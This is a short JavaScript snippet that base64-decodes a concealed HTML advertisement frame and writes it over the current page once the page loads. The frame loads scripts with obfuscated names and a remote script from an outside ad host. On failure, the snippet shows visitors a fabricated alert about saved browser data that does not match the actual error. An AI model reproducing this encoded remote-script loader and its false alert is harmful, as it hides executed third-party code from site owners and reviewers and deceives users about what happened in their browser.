(async () => {
  await new Promise(e => {
    const d = () => setTimeout(e, 0);
    if (document.readyState === "complete") d(); else window.addEventListener("load", d, {
      once: true
    });
  });
  const e = (new TextDecoder).decode(Uint8Array.from(atob([ "PCFkb2N0eXBlIGh0bWw+IDxodG1sIGxhbmc9ImVuIj4gPGhlYWQ+IDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4gPG1ldGEgbmFtZT0idmlld3BvcnQi", "IGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEiPiA8dGl0bGU+QWR2ZXJ0aXNlbWVudDwvdGl0bGU+IDxzdHlsZT5i", "b2R5LGh0bWx7bWFyZ2luOjA7cGFkZGluZzowO3dpZHRoOjE2MHB4O2hlaWdodDo2MDBweDtvdmVyZmxvdzpoaWRkZW47YmFja2dyb3VuZDowIDB9", "aWZyYW1le2JvcmRlcjowfTwvc3R5bGU+IDxzY3JpcHQgZGVmZXI9ImRlZmVyIiBzcmM9Ii9qcy9AcmI3MjY4YjFjNDRjZjMyYzAyZGYzMzU4MCEu", "anMiPjwvc2NyaXB0PiA8L2hlYWQ+IDxib2R5PiA8c2NyaXB0IGRhdGEtY2Zhc3luYz0iZmFsc2UiIHNyYz0iLi9AcjUyMWI3Mjg4ODMzOWMzZWUw", "YmQ1ZTNjYyEuanMiPjwvc2NyaXB0PiA8c2NyaXB0IGRhdGEtY2Zhc3luYz0iZmFsc2UiPndpbmRvdy5hdE9wdGlvbnMgPSB7CiAga2V5OiAiMjc0", "YzVlNmFjYTc1YTBkZWZjMjVjZGY2YWEzYzdhMTciLAogIGZvcm1hdDogImlmcmFtZSIsCiAgaGVpZ2h0OiA2MDAsCiAgd2lkdGg6IDE2MCwKICBw", "YXJhbXM6IHt9Cn08L3NjcmlwdD4gPHNjcmlwdCBkYXRhLWNmYXN5bmM9ImZhbHNlIiBzcmM9Imh0dHBzOi8vYmljZWEub3JnLzIyLzI3NGM1ZTZh", "Y2E3NWEwZGVmYzI1Y2RmNmFhM2M3YTE3IiBvbmVycm9yPSdwYXJlbnQucG9zdE1lc3NhZ2UoewogIHR5cGU6ICJueXg6c3BvbnNvci11bmF2YWls", "YWJsZSIKfSwgIioiKSc+PC9zY3JpcHQ+IDwvYm9keT4gPC9odG1sPiAK" ].join("")), e => e.charCodeAt(0)));
  document.open();
  document.write(e);
  document.close();
})().catch(() => {
  const e = document.createElement("p");
  e.setAttribute("role", "alert");
  e.textContent = "Saved browser data could not be updated. Close other site tabs and reload.";
  document.body.prepend(e);
});